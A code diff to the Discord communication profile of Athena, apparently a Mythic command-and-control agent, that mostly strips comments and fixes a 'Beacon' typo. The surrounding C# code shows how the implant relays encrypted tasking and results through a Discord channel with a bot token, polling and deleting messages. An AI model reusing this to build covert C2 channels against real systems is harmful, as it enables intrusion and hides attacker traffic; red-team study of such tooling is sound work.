@@ -6,7 +6,6 @@ using Athena.Models.Mythic.Tasks;
 using Athena.Profiles.Discord.Models;
 using Athena.Models.Comms.SMB;
 using Athena.Utilities;
-
 using System.Diagnostics;
 using System.Net;
 using System.Net.Http.Headers;
@@ -31,7 +30,7 @@ namespace Profiles
         private HttpClient discordClient { get; set; }
         private string BotToken { get; set; }
         private string ChannelID { get; set; }
-        private int timeBetweenChecks { get; set; } //How long (in seconds) to wait in between checks
+        private int timeBetweenChecks { get; set; }
         private string userAgent { get; set; }
         private string proxyHost { get; set; }
         private string proxyPass { get; set; }
@@ -97,14 +96,10 @@ namespace Profiles
                 this.discordClient.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
             }
         }
-        //Dockerfile, config.json, c2_server.sh, C2_RPC_functions, dicsord.py
         public async Task<string> Send(string json)
         {
             try
             {
-                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-                //This will check to see if it needs to be encrypted first and convert the string properly. You can likely keep this here.
-                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -185,9 +180,6 @@ namespace Profiles
 
                 DeleteMessages(msgToRemove);
 
-                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-                //This will check to see if it needs to be decrypted first and convert the string properly. You can likely keep this here.
-                //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                 if (this.encrypted)
                 {
                     return this.crypt.Decrypt(strRes);
@@ -229,10 +221,10 @@ namespace Profiles
             var url = "https://discordapp.com/api/channels/" + this.ChannelID + "/" + "messages?limit=10";
             var res = await discordClient.GetAsync(url);
             string ResponseMessages = await res.Content.ReadAsStringAsync();
-            return JsonSerializer.Deserialize<List<ServerDetails>>(ResponseMessages) ?? new List<ServerDetails>(); // eithe return the responses Or if it fails get a derisalised response AKA with d ata or no data
+            return JsonSerializer.Deserialize<List<ServerDetails>>(ResponseMessages) ?? new List<ServerDetails>();
         }
 
-        public async Task<bool> SendAttachment(string msg) //8mb by default, A file upload size limit applies to all files in a request 
+        public async Task<bool> SendAttachment(string msg) //8mb by default, size limit applies to all files in a request 
         {
             try
             {
@@ -261,7 +253,7 @@ namespace Profiles
         private async Task<string> GetFileContentsAsync(string url)
         {
             string message;
-            HttpClient client = new HttpClient(); //Needed to create a new one because potentially the headers causing a 401 unauthorized response?
+            HttpClient client = new HttpClient();
 
             using (HttpResponseMessage response = await client.GetAsync(url))
             {
@@ -283,7 +275,7 @@ namespace Profiles
             return message.TrimStart('"').TrimEnd('"').Replace("\\\"", "\"");
 
         }
-        public async Task<bool> DeleteMessages(List<string> messages) //server and guild are the same lol
+        public async Task<bool> DeleteMessages(List<string> messages)
         {
             bool success = false;
             foreach (var id in messages)
@@ -341,7 +333,7 @@ namespace Profiles
                 }
                 catch (Exception e)
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Becaon attempt failed {e}");
+                    Debug.WriteLine($"[{DateTime.Now}] Beacon attempt failed {e}");
                     this.currentAttempt++;
                 }
 
